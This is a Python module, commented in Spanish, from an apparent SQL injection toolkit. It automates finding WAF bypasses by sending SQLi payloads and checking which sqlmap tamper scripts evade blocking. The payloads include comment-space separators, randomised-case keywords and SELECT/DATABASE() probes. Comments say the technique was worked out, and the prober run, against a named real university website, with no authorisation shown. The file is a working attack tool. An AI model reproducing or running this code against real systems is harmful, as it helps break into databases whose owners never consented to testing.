"""Descubrimiento automático de bypass de WAF.

Cuando el WAF detectado es de vendor desconocido (`unknown` o
`keyword_sinkhole` -- ver `WAFDetector`), `TamperSelector` ya aplica un
fallback estático `[space2comment, scalarfuncbypass, between,
randomcase]` -- una adivinanza derivada del hallazgo manual contra
itescam.edu.mx, aplicada a ciegas a CUALQUIER target con WAF
desconocido, sin validar si de verdad funciona ahí.

Este módulo automatiza el proceso de prueba A/B que un humano hizo a
mano para encontrar esos dos bypasses (una variable por vez, comparando
contra un baseline bloqueado y un control limpio) -- usando requests
HTTP crudos, sin invocar sqlmap, así que es rápido (una decena de
requests, no un scan completo) y se puede correr ANTES de comprometerse
a una corrida lenta de sqlmap con una config de tampers adivinada.

No es "un bypass universal": el resultado es específico de ESTE target
puntual, y el método documenta explícitamente qué se probó y qué
funcionó -- nunca "no se pudo" en silencio.
"""

from typing import Any, Optional

import requests

from inyector.recon.waf_detector import WAFDetector
from inyector.utils.logger import get_logger
from inyector.utils.response_compare import responses_similar
from inyector.utils.scalar_func_bypass import strip_select_before_scalar_func

logger = get_logger(__name__)

# Mutaciones de espacio a probar, en orden, cada una mapeada al tamper
# real de sqlmap que aplica la misma transformación. "AND" se mantiene
# literal en todas -- la variable bajo prueba es el separador, no la
# keyword.
SPACE_MUTATIONS = [
    ("/**/", "space2comment"),
    ("+", "space2plus"),
    ("  ", "multiplespaces"),
]

# Case-randomization de la keyword misma (separador espacio literal,
# sin cambiar) -- variable distinta a las de arriba.
CASE_RANDOMIZED_KEYWORD = "AnD"


class WAFBypassProber:
    """Prueba empíricamente qué mutaciones de payload esquivan el
    bloqueo del WAF de un target puntual."""

    def discover(self, url: str, session: requests.Session, param: str,
                 method: str = "GET", data: Optional[str] = None) -> dict:
        """Corre la batería de pruebas A/B contra el target.

        Args:
            url: URL del target (con o sin query string propia).
            session: Sesión HTTP ya configurada.
            param: Parámetro a probar (se usa como ancla de la
                inyección de prueba).
            method: Método HTTP -- de momento solo se prueba vía GET
                (ver nota en el cuerpo del método).
            data: Sin uso por ahora (reservado para soporte POST).

        Returns:
            {
                "baseline_blocked": bool,
                "tested": [str, ...],       # evidencia legible
                "confirmed_tampers": [str, ...],
            }
        """
        resultado: dict[str, Any] = {
            "baseline_blocked": False,
            "tested": [],
            "confirmed_tampers": [],
        }

        separator = "&" if "?" in url else "?"
        detector = WAFDetector()

        clean_url = f"{url}{separator}{param}=1"
        blocked_url = f"{url}{separator}{param}=1 AND 1=1"

        clean_resp = self._safe_get(session, clean_url)
        baseline_resp = self._safe_get(session, blocked_url)

        if not self._is_blocked(detector, baseline_resp, url):
            resultado["tested"].append(
                "Baseline ('AND 1=1' con espacio literal) NO se bloqueó -- "
                "este WAF no parece filtrar por keyword+espacio, nada que "
                "bypassear en ese frente."
            )
            return resultado

        resultado["baseline_blocked"] = True
        resultado["tested"].append(
            "Baseline ('AND 1=1' con espacio literal) bloqueado -- "
            "confirma filtro de keyword+espacio."
        )

        # Mutaciones de espacio, una por vez.
        working_separator = None
        for mutation, tamper_name in SPACE_MUTATIONS:
            mutated_url = f"{url}{separator}{param}=1 AND{mutation}1=1"
            resp = self._safe_get(session, mutated_url)
            bypassed = (
                not self._is_blocked(detector, resp, url)
                and responses_similar(resp, clean_resp)
            )
            resultado["tested"].append(
                f"Separador '{mutation}' (tamper {tamper_name}): "
                f"{'esquivó el bloqueo' if bypassed else 'sigue bloqueado'}."
            )
            if bypassed:
                resultado["confirmed_tampers"].append(tamper_name)
                working_separator = mutation
                break  # el primero que funcione alcanza para este frente

        if working_separator is None:
            case_url = (
                f"{url}{separator}{param}=1 {CASE_RANDOMIZED_KEYWORD} 1=1"
            )
            resp = self._safe_get(session, case_url)
            bypassed = (
                not self._is_blocked(detector, resp, url)
                and responses_similar(resp, clean_resp)
            )
            resultado["tested"].append(
                f"Case-randomization de la keyword ('{CASE_RANDOMIZED_KEYWORD}', "
                f"tamper randomcase): "
                f"{'esquivó el bloqueo' if bypassed else 'sigue bloqueado'}."
            )
            if bypassed:
                resultado["confirmed_tampers"].append("randomcase")
                working_separator = " "  # espacio literal, solo cambió el case

        # Prueba aislada de la keyword SELECT -- usa el separador que ya
        # funcionó (o /**/  por default si ninguno lo hizo, para poder
        # aislar esta variable igual) para no mezclar ambos filtros.
        select_separator = working_separator or "/**/"
        select_payload = (
            f"1 AND{select_separator}(SELECT{select_separator}DATABASE())="
            f"(SELECT{select_separator}DATABASE())"
        )
        no_select_payload = (
            f"1 AND{select_separator}("
            f"{strip_select_before_scalar_func(f'SELECT{select_separator}DATABASE()')})="
            f"({strip_select_before_scalar_func(f'SELECT{select_separator}DATABASE()')})"
        )

        select_url = f"{url}{separator}{param}={select_payload}"
        no_select_url = f"{url}{separator}{param}={no_select_payload}"

        select_resp = self._safe_get(session, select_url)
        no_select_resp = self._safe_get(session, no_select_url)

        select_blocked = self._is_blocked(detector, select_resp, url)
        no_select_bypassed = (
            not self._is_blocked(detector, no_select_resp, url)
            and (working_separator is not None or select_blocked)
        )

        if select_blocked and no_select_bypassed:
            resultado["tested"].append(
                "Keyword 'SELECT' aislada: bloqueada con la función escalar "
                "envuelta en SELECT, no bloqueada removiendo 'SELECT' "
                "(tamper scalarfuncbypass) -- confirma filtro de keyword "
                "SELECT independiente del de espacio."
            )
            resultado["confirmed_tampers"].append("scalarfuncbypass")
        else:
            resultado["tested"].append(
                "Keyword 'SELECT' aislada: sin evidencia de un filtro "
                "propio (no se agrega scalarfuncbypass)."
            )

        return resultado

    def _safe_get(self, session: requests.Session,
                  url: str) -> Optional[requests.Response]:
        # allow_redirects=False a propósito -- mismo motivo que el
        # probe de sinkhole en WAFDetector: si el WAF bloquea
        # redirigiendo a un dominio que ni resuelve (keyword_sinkhole),
        # dejar que requests siga ese redirect dispara reintentos de
        # resolución DNS con backoff (varios segundos por request) sin
        # aportar nada -- ya alcanza con inspeccionar el header
        # 'Location' crudo (ver _is_blocked). Bug real encontrado
        # corriendo este mismo prober contra itescam.edu.mx: sin esto,
        # cada mutación que seguía bloqueada tardaba varios segundos de
        # más solo en reintentos de DNS.
        try:
            return session.get(url, timeout=30, allow_redirects=False)
        except requests.exceptions.RequestException:
            return None

    def _is_blocked(self, detector: WAFDetector,
                    response: Optional[requests.Response],
                    original_url: str) -> bool:
        """True si la respuesta parece un bloqueo -- ya sea por status
        code + firma (`_classify_block_response`, mismo criterio que
        `WAFDetector`) o por un redirect cross-host tipo sinkhole
        (mismo criterio que el probe de `WAFDetector` contra
        itescam.edu.mx, pero generalizado acá a CUALQUIER mutación, no
        solo al probe inicial de detección).
        """
        if response is None:
            # Sin respuesta (timeout/conexión rechazada) es indistinguible
            # de "bloqueado agresivamente" -- más seguro tratarlo como
            # bloqueo que asumir que la mutación bypasseó algo.
            return True

        if detector._classify_block_response(response) is not None:
            return True

        location = response.headers.get("Location", "")
        if response.status_code in (301, 302, 303, 307, 308) and location:
            from urllib.parse import urlparse
            redirect_host = urlparse(location).netloc
            target_host = urlparse(original_url).netloc
            if redirect_host and redirect_host != target_host:
                return True

        return False
